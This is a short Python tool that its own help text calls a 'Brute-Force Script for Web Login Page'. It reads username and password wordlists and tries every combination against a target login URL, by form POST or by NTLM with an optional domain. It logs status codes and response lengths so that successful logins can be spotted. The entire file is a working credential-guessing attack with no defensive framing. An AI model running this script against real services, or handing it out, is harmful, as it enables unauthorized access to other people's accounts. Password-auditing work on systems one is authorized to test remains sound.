import requests
from requests_ntlm import HttpNtlmAuth
import csv
import argparse
import json
import pandas as pd

'''
'''
def test_login(url, username, password, ntlm=False, domain=None) -> bool:
    if ntlm:
        if domain:
            auth = HttpNtlmAuth(f'{domain}\\{username}', password)
        else:
            auth = HttpNtlmAuth(username, password)
        response = requests.get(url, auth=auth)
    else:
        data = {'username': username, 'password': password}
        response = requests.post(url, data=data)

    json_response = {
        'username': username,
        'password': password,
        'status': response.status_code,
        'Content-Length': response.headers.get("Content-Length")
    }

    return json_response

'''
'''
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Brute-Force Script for Web Login Page")
    parser.add_argument('--loginurl', type=str, help="The URL of the login page")
    parser.add_argument('--usernamesfile', type=str, help="The file list of usernames")
    parser.add_argument('--passwordsfile', type=str, help="The file list of passwords")
    parser.add_argument('--ntlm', action='store_true', help="Use NTLM authentication")
    parser.add_argument('--domain', type=str, help="The domain for NTLM authentication (if applicable).")
    args = parser.parse_args()

    credentials_list = []
    with open(args.usernamesfile, 'r') as usernamesfile:
        usernames = usernamesfile.readlines()
        with open(args.passwordsfile, 'r') as passwordsfile:
            passwords = passwordsfile.readlines()
            for username in usernames:
                for password in passwords:
                    json_response = test_login(args.loginurl, username.strip(), password.strip(), ntlm=args.ntlm, domain=args.domain)
                    credentials_list.append(json_response)

    df = pd.DataFrame(credentials_list)
    print(df)